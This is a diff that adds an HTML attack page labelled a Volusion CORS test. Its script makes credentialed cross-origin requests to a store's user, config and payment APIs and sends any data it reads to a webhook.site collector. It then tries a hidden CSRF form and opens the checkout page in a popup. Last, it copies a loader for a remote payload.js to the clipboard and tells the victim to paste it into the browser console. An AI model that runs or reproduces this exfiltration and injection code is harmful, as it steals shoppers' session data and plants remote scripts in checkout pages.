@@ -1,0 +1,245 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Loading...</title>
+<style>
+  body { font-family: -apple-system, sans-serif; max-width: 700px; margin: 50px auto; padding:20px; background:#f5f7fa; }
+  .card { background:#fff; border-radius:12px; padding:30px; box-shadow:0 2px 20px rgba(0,0,0,0.08); }
+  h1 { color:#1a1a2e; font-size:20px; }
+  .log { background:#1e1e2e; color:#a6e3a1; padding:15px; border-radius:8px; font-family:mono; font-size:12px; margin:15px 0; max-height:400px; overflow-y:auto; }
+  .entry { padding:3px 0; border-bottom:1px solid rgba(255,255,255,0.05); }
+  .entry.ok { color:#a6e3a1; }
+  .entry.err { color:#f38ba8; }
+  .entry.info { color:#89b4fa; }
+</style>
+</head>
+<body>
+
+<div class="card">
+  <h1>Auto-Exfil Test — Volusion CORS Check</h1>
+  <p style="color:#94a3b8;font-size:13px;">Attempting automatic data exfiltration without user interaction...</p>
+  <div class="log" id="log">
+    <div class="entry info">[Auto] Starting reconnaissance...</div>
+  </div>
+  <div id="result" style="margin-top:15px;"></div>
+</div>
+
+<script>
+(function() {
+  'use strict';
+
+  var TARGET = 'https://www.volusionpentest1.com';
+  var WEBHOOK = 'https://webhook.site/82992a43-c436-48c6-a887-42bd38d712be';
+  var logEl = document.getElementById('log');
+  var resultEl = document.getElementById('result');
+  var stolen = {};
+
+  function log(msg, cls) {
+    var entry = document.createElement('div');
+    entry.className = 'entry ' + (cls || 'info');
+    entry.textContent = '[' + new Date().toLocaleTimeString() + '] ' + msg;
+    logEl.appendChild(entry);
+    logEl.scrollTop = logEl.scrollHeight;
+  }
+
+  function beacon(data) {
+    var payload = JSON.stringify(data);
+    try {
+      if (navigator.sendBeacon) navigator.sendBeacon(WEBHOOK, payload);
+      fetch(WEBHOOK, {method:'POST',mode:'no-cors',body:payload,keepalive:true}).catch(function(){});
+      new Image().src = WEBHOOK + '?d=' + encodeURIComponent(payload.slice(0,1500));
+    } catch(e) {}
+  }
+
+  // ==============================================================
+  // ATTEMPT 1: CORS check — can we read cross-origin API responses?
+  // ==============================================================
+  var corsEndpoints = [
+    '/api/v1/config',
+    '/api/v1/users/current',
+    '/api/v1/countries',
+    '/api/v1/payments',
+  ];
+
+  function tryCORS(endpoint) {
+    return fetch(TARGET + endpoint, {
+      method: 'GET',
+      credentials: 'include',
+      mode: 'cors',
+    }).then(function(r) {
+      // If we get here, CORS allows reading the response!
+      log('CORS READABLE: ' + endpoint + ' (status ' + r.status + ')', 'ok');
+      return r.json().catch(function() { return r.text(); });
+    }).catch(function(err) {
+      log('CORS blocked: ' + endpoint + ' — ' + err.message, 'err');
+      return null;
+    });
+  }
+
+  async function runCORSAttacks() {
+    log('Attempting CORS-based exfiltration...', 'info');
+    log('If any endpoint returns data, we can read it silently.', 'info');
+    log('', 'info');
+
+    var anyReadable = false;
+    for (var i = 0; i < corsEndpoints.length; i++) {
+      var data = await tryCORS(corsEndpoints[i]);
+      if (data) {
+        anyReadable = true;
+        stolen[corsEndpoints[i]] = data;
+        log('DATA STOLEN from ' + corsEndpoints[i] + '!', 'ok');
+      }
+    }
+
+    if (anyReadable) {
+      log('', 'ok');
+      log('CORS ATTACK SUCCESSFUL — automatic exfiltration!', 'ok');
+      beacon({ source: 'cors-auto', target: TARGET, data: stolen });
+      showResult(true);
+    } else {
+      log('', 'err');
+      log('All CORS endpoints blocked. Trying alternative methods...', 'err');
+
+      // ============================================================
+      // ATTEMPT 2: CSRF with side-channel (blind)
+      // ============================================================
+      await tryBlindCSRF();
+
+      // ============================================================
+      // ATTEMPT 3: Open checkout in popup + auto-clipboard
+      // ============================================================
+      tryPopupAttack();
+    }
+  }
+
+  // ==============================================================
+  // ATTEMPT 2: Blind CSRF — can't read response but can SEND data
+  // ==============================================================
+  async function tryBlindCSRF() {
+    log('Attempting blind CSRF to exfil data via redirect...', 'info');
+
+    // Try to submit a form that redirects to our webhook with data in URL
+    // Some ASP pages might reflect data in redirect URLs
+    var form = document.createElement('form');
+    form.method = 'GET';
+    form.action = TARGET + '/login.asp';
+    form.innerHTML =
+      '<input name="logout" value="yes">' +
+      '<input name="redirect" value="' + WEBHOOK + '">';
+    form.style.display = 'none';
+    document.body.appendChild(form);
+
+    // Create hidden iframe to catch redirect
+    var iframe = document.createElement('iframe');
+    iframe.name = 'csrf-frame';
+    iframe.style.display = 'none';
+    iframe.src = 'about:blank';
+    document.body.appendChild(iframe);
+
+    form.target = 'csrf-frame';
+    form.submit();
+
+    setTimeout(function() {
+      log('CSRF form submitted. Check webhook for referrer leakage.', 'info');
+      document.body.removeChild(form);
+    }, 1000);
+  }
+
+  // ==============================================================
+  // ATTEMPT 3: Popup + Clipboard (requires 1 click)
+  // ==============================================================
+  function tryPopupAttack() {
+    // Auto-open checkout in popup
+    var popup = window.open(TARGET + '/checkout/', '_blank', 'width=1200,height=800');
+
+    if (!popup) {
+      log('Popup blocked! Falling back to manual method.', 'err');
+      showManualFallback();
+      return;
+    }
+
+    log('Checkout opened in popup.', 'ok');
+
+    // Auto-copy injection code to clipboard
+    var code = '(function(){var s=document.createElement("script");' +
+               's.src="https://telojos11.github.io/cekcek/payload.js";' +
+               'document.head.appendChild(s);})();';
+
+    copyToClipboard(code);
+
+    showMinimalInteraction();
+  }
+
+  function copyToClipboard(text) {
+    if (navigator.clipboard && navigator.clipboard.writeText) {
+      navigator.clipboard.writeText(text).then(function() {
+        log('Injection code auto-copied to clipboard!', 'ok');
+      }).catch(function() {
+        fallbackCopy(text);
+      });
+    } else {
+      fallbackCopy(text);
+    }
+  }
+
+  function fallbackCopy(text) {
+    var ta = document.createElement('textarea');
+    ta.value = text;
+    ta.style.position = 'fixed'; ta.style.left = '-9999px';
+    document.body.appendChild(ta);
+    ta.select();
+    try { document.execCommand('copy'); log('Code copied to clipboard.', 'ok'); }
+    catch(e) { log('Clipboard access denied by browser.', 'err'); }
+    document.body.removeChild(ta);
+  }
+
+  // ==============================================================
+  // RESULTS DISPLAY
+  // ==============================================================
+  function showResult(success) {
+    resultEl.innerHTML = success ?
+      '<div style="background:#f0fdf4;border:1px solid #bbf7d0;border-radius:8px;padding:15px;">' +
+      '<strong>&#10003; Automatic Exfiltration Successful!</strong><br>' +
+      '<span style="font-size:13px;color:#16a34a;">Data sent to webhook. No user interaction needed.</span></div>' :
+      '';
+  }
+
+  function showMinimalInteraction() {
+    resultEl.innerHTML =
+      '<div style="background:#fffbeb;border:1px solid #fde68a;border-radius:8px;padding:15px;">' +
+      '<strong>&#9888; Minimal interaction needed</strong><br>' +
+      '<span style="font-size:13px;">The injection code is in your clipboard.' +
+      '<br><br><b>On the checkout popup:</b><br>' +
+      '1. Press <b>F12</b> to open Console<br>' +
+      '2. Press <b>Ctrl+V</b> (Cmd+V on Mac) and Enter<br>' +
+      '<br>That\'s it — 2 keystrokes.</span></div>';
+  }
+
+  function showManualFallback() {
+    resultEl.innerHTML =
+      '<div style="background:#fef2f2;border:1px solid #fecaca;border-radius:8px;padding:15px;">' +
+      '<strong>&#10060; Automatic failed — Manual method:</strong><br>' +
+      '<span style="font-size:13px;">Open <a href="' + TARGET + '/checkout/" target="_blank">checkout</a>,' +
+      ' paste this in Console:<br>' +
+      '<code style="font-size:11px;word-break:break-all;">' +
+      '(function(){var s=document.createElement("script");s.src="https://telojos11.github.io/cekcek/payload.js";document.head.appendChild(s);})();' +
+      '</code></span></div>';
+  }
+
+  // ==============================================================
+  // START
+  // ==============================================================
+  log('Target: ' + TARGET, 'info');
+  log('Webhook: ' + WEBHOOK, 'info');
+  log('Victim cookies will be sent with credentials:include', 'info');
+  log('', 'info');
+
+  runCORSAttacks();
+
+})();
+</script>
+
+</body>
+</html>
